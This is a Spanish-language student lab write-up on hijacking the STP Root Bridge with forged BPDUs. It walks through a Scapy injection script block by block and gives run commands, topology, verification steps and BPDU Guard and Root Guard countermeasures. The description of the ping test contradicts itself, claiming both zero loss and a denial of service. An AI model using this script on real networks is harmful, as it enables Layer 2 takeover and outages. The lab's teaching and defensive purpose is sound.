# Ataque STP Claim Root Attack
**Jordy Rosario · Matrícula: 20250737**
Seguridad de Redes 2026-C-2 · ITLA

---

## 📋 Tabla de Contenido

1. [Objetivo del Laboratorio](#1-objetivo-del-laboratorio)
2. [Objetivo del Script](#2-objetivo-del-script)
   - [Parámetros de Uso](#21-parámetros-de-uso)
   - [Requisitos del Sistema](#22-requisitos-del-sistema)
3. [Funcionamiento del Script](#3-funcionamiento-del-script)
4. [Documentación de la Red](#4-documentación-de-la-red)
   - [Topología](#41-topología)
   - [Tabla de Dispositivos y Direccionamiento IP](#42-tabla-de-dispositivos-y-direccionamiento-ip)
5. [Ejecución del Ataque](#5-ejecución-del-ataque)
6. [Capturas de Pantalla](#6-capturas-de-pantalla)
7. [Contramedidas y Mitigación](#7-contramedidas-y-mitigación)
8. [Video Demostrativo](#8-video-demostrativo)
9. [Referencias](#9-referencias)

---

## 1. Objetivo del Laboratorio

El objetivo de este laboratorio es **evidenciar las debilidades del protocolo Spanning Tree (STP/802.1D)** frente a la inyección de tráfico no autenticado de Capa 2.

Se busca demostrar cómo un atacante conectado a un **puerto de acceso convencional** puede forzar un cambio completo en la topología de la red, usurpando el rol de **Root Bridge** y logrando:

- Manipular qué puertos quedan en estado *Forwarding* o *Blocking* en toda la topología.
- Forzar reconvergencias STP continuas que degradan la disponibilidad de la red (**DoS topológico**).
- Demostrar el riesgo de exponer BPDUs en puertos de acceso hacia usuarios finales.

Este laboratorio se realiza íntegramente en un entorno controlado y virtualizado con fines **exclusivamente educativos** dentro del curso de Seguridad de Redes del ITLA.

---

## 2. Objetivo del Script

El script `STP_Claim_Root_Attack.py` utiliza la librería **Scapy** para construir e inyectar de manera constante **BPDUs (Bridge Protocol Data Units)** manipuladas hacia los switches de la red.

El código establece los valores de `rootid` y `bridgeid` a `0` (la prioridad más alta en STP) e inventa una dirección MAC numéricamente inferior a la de cualquier equipo Cisco legítimo. Estos paquetes se envían cada 2 segundos a la dirección multicast reservada `01:80:C2:00:00:00`, engañando a los switches para que reconozcan al atacante como el Root Bridge legítimo.

### 2.1 Parámetros de Uso

```bash
sudo python3 STP_Claim_Root_Attack.py [INTERFAZ]
```

| Parámetro | Descripción | Requerido | Ejemplo |
|-----------|-------------|-----------|---------|
| `INTERFAZ` | Interfaz de red desde donde se inyectarán las tramas BPDU | No (default: `eth0`) | `eth0`, `eth1` |

**Ejemplos de uso:**
```bash
# Usando la interfaz por defecto (eth0)
sudo python3 STP_Claim_Root_Attack.py

# Especificando una interfaz diferente
sudo python3 STP_Claim_Root_Attack.py eth1
```

### 2.2 Requisitos del Sistema

| Requisito | Detalle |
|-----------|---------|
| **Sistema Operativo** | Kali Linux (virtualizado en QEMU/PNETLab) |
| **Lenguaje** | Python 3 |
| **Dependencia principal** | `scapy` (incluye soporte nativo para STP) |
| **Privilegios** | `sudo` / `root` obligatorio (raw sockets en Capa 2) |
| **Interfaz de red** | `eth0` (ajustable por argumento) |
| **Entorno de red** | Conectado al mismo segmento L2 que los switches objetivo |

**Instalación de dependencias:**
```bash
pip install scapy
```

---

## 3. Funcionamiento del Script

A continuación se explica el script **bloque por bloque**:

### Bloque 1: Importación de Módulos

```python
import sys
import time
from scapy.all import *
```

- `sys`: permite leer argumentos de la línea de comandos (nombre de interfaz).
- `time`: para respetar el temporizador Hello Time de STP (2 segundos).
- `from scapy.all import *`: importa toda la funcionalidad de Scapy, incluyendo `Ether`, `LLC`, `STP`, `get_if_hwaddr` y `sendp`. A diferencia del ataque CDP, STP es un protocolo estándar que Scapy soporta de forma nativa sin necesidad de `load_contrib`.

---

### Bloque 2: Construcción de la Capa Ethernet

```python
mac_multicast_stp = "01:80:c2:00:00:00"
mac_falsa_atacante = "00:00:00:00:00:01"
capa_ethernet = Ether(dst=mac_multicast_stp, src=get_if_hwaddr(interfaz))
```

- `01:80:c2:00:00:00`: dirección MAC multicast reservada por IEEE para tramas STP (802.1D). Todo switch la escucha obligatoriamente.
- `get_if_hwaddr(interfaz)`: obtiene la MAC real de la interfaz atacante como origen de la trama Ethernet.
- La MAC falsa `00:00:00:00:00:01` se usará en los campos de identidad STP para garantizar ganar la elección de Root Bridge.

---

### Bloque 3: Construcción de la Capa LLC

```python
capa_llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
```

- Encapsulación LLC requerida por el estándar **IEEE 802.1D** para tramas de protocolo de puente.
- `dsap=0x42` y `ssap=0x42`: identificadores de la SAP (Service Access Point) de Spanning Tree.
- A diferencia del CDP (que usa SNAP), STP usa LLC directamente sin subcapa SNAP.

---

### Bloque 4: Construcción de la Carga Útil BPDU

```python
capa_stp = STP(
    bpdutype=0x00,
    bpduflags=0x00,
    rootid=0,
    rootmac=mac_falsa_atacante,
    bridgeid=0,
    bridgemac=mac_falsa_atacante,
    portid=0x8002
)
```

- `bpdutype=0x00`: indica un **Configuration BPDU**, el tipo usado por STP para la elección del Root Bridge.
- `rootid=0` y `bridgeid=0`: establecen la prioridad STP al valor mínimo posible (0), garantizando que este nodo gane cualquier elección frente a los valores estándar de Cisco (32768).
- `rootmac` y `bridgemac = "00:00:00:00:00:01"`: MAC numéricamente inferior a cualquier equipo real, lo que asegura ganar incluso en caso de empate de prioridad.
- `portid=0x8002`: identificador del puerto del atacante dentro del BPDU.

---

### Bloque 5: Ensamblado, Envío y Temporizador

```python
paquete_bpdu = capa_ethernet / capa_llc / capa_stp
sendp(paquete_bpdu, iface=interfaz, verbose=False)
time.sleep(2)
```

- El operador `/` de Scapy apila las capas del paquete de menor a mayor nivel.
- `sendp()`: envía el paquete a nivel de Capa 2 (raw socket) sin pasar por la pila TCP/IP del sistema operativo.
- `time.sleep(2)`: respeta el **Hello Time** estándar de STP (2 segundos), que es el intervalo al que los switches esperan recibir BPDUs del Root Bridge. Enviando en este intervalo, el atacante mantiene su posición como Root de forma indefinida.

---

### Bloque 6: Bucle de Inyección

```python
while True:
    # ... construir y enviar BPDU
```

- El bucle infinito mantiene la usurpación activa de forma continua.
- Se detiene con `Ctrl+C`, capturado con `KeyboardInterrupt`. Al detenerse, la red reconverge de vuelta al Root Bridge legítimo.

---

## 4. Documentación de la Red

### 4.1 Topología

```
                    ┌─────────────┐
                    │     R1      │ ← Router / Gateway / DHCP
                    │ e0/0        │
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SW1      │ ← Switch Core / Distribución
                    │             │   (Trunk 802.1Q)
                    └──────┬──────┘
                           │ e0/1 → e0/0
                    ┌──────┴──────┐
          ┌─────────┤    SW2      ├─────────┐
          │ e0/3    │             │ e0/1    │ e0/2
          │         └─────────────┘         │
   ┌──────┴──────┐                   ┌──────┴──────┐  ┌─────────────┐
   │ Kali Linux  │                   │    VPC1     │  │    VPC2     │
   │  (atacante) │                   │(Víctima A)  │  │(Víctima B)  │
   └──────┬──────┘                   └─────────────┘  └─────────────┘
          │ e1
   ┌──────┴──────┐
   │     Net     │ ← Red externa (conexión SSH)
   └─────────────┘
```

> Ver imagen de topología: [01_topologia](screenshots/topologia.png)

### 4.2 Tabla de Dispositivos y Direccionamiento IP

El esquema de red utiliza la subred `20.25.37.0/24` derivada de la matrícula `20250737`.

| Dispositivo | Tipo | Interfaz | IP | VLAN | Rol |
|-------------|------|----------|----|------|-----|
| **R1** | Router IOL | e0/0 | 20.25.37.1/24 | VLAN 10 | Default Gateway + Servidor DHCP |
| **SW1** | Switch IOL | e0/0, e0/1 | N/A | Trunk 802.1Q | Switch Core / Distribución |
| **SW2** | Switch IOL | e0/0–e0/3 | N/A | e0/0 Trunk; e0/1–e0/3 Access VLAN 10 | Switch de Acceso |
| **Kali Linux** | VM QEMU | eth0 (e0/3 SW2), e1 | 20.25.37.100/24 | VLAN 10 (Access) | Nodo Atacante |
| **VPC1** | VPC | eth0 | DHCP (rango .0/24) | VLAN 10 | Cliente Legítimo (Víctima A) |
| **VPC2** | VPC | eth0 | DHCP (rango .0/24) | VLAN 10 | Cliente Legítimo (Víctima B) |

> Este ataque opera en **Capa 2 (Data Link)**. Las IPs se documentan por completitud de la topología pero no son requeridas para ejecutar el ataque.

---

## 5. Ejecución del Ataque

### Paso 1: Preparar el entorno en Kali Linux

```bash
# Verificar interfaz de red
ip addr show eth0

# Instalar dependencias si no están presentes
pip install scapy

# Clonar el repositorio
git clone https://github.com/Jordy513/P2_STP_Root_20250737.git
cd P2_STP_Root_20250737
```

### Paso 2: Verificar el Root Bridge legítimo (ANTES del ataque)

```cisco
SW1# show spanning-tree vlan 10
SW2# show spanning-tree vlan 10
```

Anota qué switch es el Root Bridge actual y su MAC.

### Paso 3: Lanzar el ataque

```bash
sudo python3 STP_Claim_Root_Attack.py eth0
```

### Paso 4: Verificar el efecto en SW2

```cisco
SW2# show spanning-tree vlan 10
```

Verás que el Root ID cambió a la MAC `0000.0000.0001` con prioridad `0`, apuntando al puerto del atacante (`Et0/3`).

```cisco
SW2# show spanning-tree vlan 10 detail
```

Observa el Root Port y los cambios de estado en los demás puertos.

### Paso 5: Verificar el DoS (ping desde VPC1)

```
VPC1> ping 20.25.37.1 repeat 1000
```

Durante la reconvergencia STP los paquetes caerán evidenciando la interrupción de servicio.

### Paso 6: Detener el ataque

```
Ctrl+C
```

La red reconverge automáticamente de vuelta al Root Bridge legítimo.

---

## 6. Capturas de Pantalla

| # | Archivo | Descripción |
|---|---------|-------------|
| 1 | [01_topologia.png](screenshots/01_topologia.png) | Vista general de la topología en PNETLab con nombre y matrícula visibles |
| 2 | [02_spanning_tree_antes_sw1.png](screenshots/02_spanning_tree_antes_sw1.png) - [02_spanning_tree_antes_sw2.png](screenshots/02_spanning_tree_antes_sw2.png) | Salida de `show spanning-tree vlan 10` en SW1/SW2 **antes** del ataque — Root legítimo |
| 3 | [03_script_ejecutandose.png](screenshots/03_script_ejecutandose.png) | Terminal de Kali Linux ejecutando el script STP Root Claim |
| 4 | [04_spanning_tree_durante.png](screenshots/04_spanning_tree_durante.png) | SW2 reconociendo `0000.0000.0001` como nuevo Root Bridge |
| 5  | [05_ping_estable_durante_ataque.png](screenshots/05_ping_estable_durante_ataque.png) | Tráfico ICMP continuo desde VPC1 sin pérdida de paquetes, demostrando una reconvergencia transparente y la naturaleza sigilosa del ataque. |
| 6 | [06_contramedida_aplicada.png](screenshots/06_contramedida_aplicada.png) | Configuración de `spanning-tree bpduguard enable` en la interfaz del atacante |
| 7 | [07_puerto_err_disabled.png](screenshots/07_puerto_err_disabled.png) | Puerto Et0/3 en estado `err-disabled` tras detectar el BPDU malicioso |

> *Las capturas se encuentran en la carpeta [/screenshots](/screenshots/README.md) de este repositorio.*

---

## 7. Contramedidas y Mitigación

La defensa principal consiste en impedir que los dispositivos de usuario final puedan participar en la elección del Root Bridge. Los puertos de acceso **nunca** deberían procesar BPDUs.

### Contramedida 1: BPDU Guard por interfaz (Recomendado)

```cisco
SW2# configure terminal
SW2(config)# interface ethernet 0/1
SW2(config-if)# spanning-tree bpduguard enable
SW2(config-if)# interface ethernet 0/2
SW2(config-if)# spanning-tree bpduguard enable
SW2(config-if)# interface ethernet 0/3
SW2(config-if)# spanning-tree bpduguard enable
SW2(config-if)# end
SW2# write memory
```

> **Efecto:** En cuanto el ASIC del switch detecta una trama BPDU entrante en esa interfaz, el puerto cambia automáticamente a estado `err-disabled`, aislando al atacante de la red de forma inmediata.

### Contramedida 2: BPDU Guard global (en todos los puertos PortFast)

```cisco
SW2# configure terminal
SW2(config)# spanning-tree portfast default
SW2(config)# spanning-tree portfast bpduguard default
SW2(config)# end
SW2# write memory
```

> **Efecto:** Aplica BPDU Guard automáticamente a todas las interfaces configuradas con PortFast, sin necesidad de configurarlo puerto por puerto.

### Contramedida 3: Root Guard (en puertos que no deben ser Root Port)

```cisco
SW1# configure terminal
SW1(config)# interface ethernet 0/1
SW1(config-if)# spanning-tree guard root
SW1(config-if)# end
SW1# write memory
```

> **Efecto:** Si llega un BPDU superior al del Root Bridge actual por esa interfaz, el puerto pasa a estado `root-inconsistent` en lugar de aceptar el nuevo Root, protegiendo la topología.

### Recuperar puerto err-disabled (tras aplicar la contramedida)

```cisco
SW2# configure terminal
SW2(config)# interface ethernet 0/3
SW2(config-if)# shutdown
SW2(config-if)# no shutdown
SW2(config-if)# end
```

### Resumen de contramedidas

| Contramedida | Comando | Alcance | Efecto |
|---|---|---|---|
| BPDU Guard por interfaz | `spanning-tree bpduguard enable` | Por puerto | Puerto pasa a `err-disabled` al detectar BPDU |
| BPDU Guard global | `spanning-tree portfast bpduguard default` | Todos los puertos PortFast | Protección automática sin config por puerto |
| Root Guard | `spanning-tree guard root` | Por puerto | Bloquea BPDUs superiores sin deshabilitar el puerto |
| PortFast | `spanning-tree portfast` | Por puerto | Elimina delay STP en puertos de acceso; prerequisito de BPDU Guard global |

---

## 8. Video Demostrativo

🎥 **[Ver demostración en YouTube]([https://youtube.com/enlace_aqui](https://youtu.be/UqLpedUFwP0))**

**Duración:** 5:00 minutos

**Contenido del video:**
- ✅ Topología visible con nombre y matrícula
- ✅ Hora y fecha del sistema visible
- ✅ Cara y voz del autor
- ✅ Root Bridge legítimo antes del ataque (`show spanning-tree`)
- ✅ Ejecución del script STP Root Claim
- ✅ Verificación del cambio de Root Bridge a `0000.0000.0001`
- ✅ DoS demostrado con ping continuo fallando
- ✅ Aplicación de BPDU Guard
- ✅ Puerto del atacante en `err-disabled`

---

## 9. Referencias

- Cisco Systems. (2023). *Spanning Tree Protocol Configuration Guide*. https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/lanswitch/configuration/xe-16/lanswitch-xe-16-book/lsw-span-tree-prot.html
- Cisco Systems. (2023). *Cisco IOS Security Configuration Guide: BPDU Guard and Root Guard*.
- Biondi, P. et al. (2024). *Scapy Documentation*. https://scapy.readthedocs.io/en/latest/
- IEEE. (2004). *IEEE 802.1D — Media Access Control (MAC) Bridges (Spanning Tree Protocol)*.
- ITLA. (2026). *Seguridad de Redes — Material de Curso 2026-C-2*.
- Troubleshooting y documentación apoyado en Inteligencia Artificial.
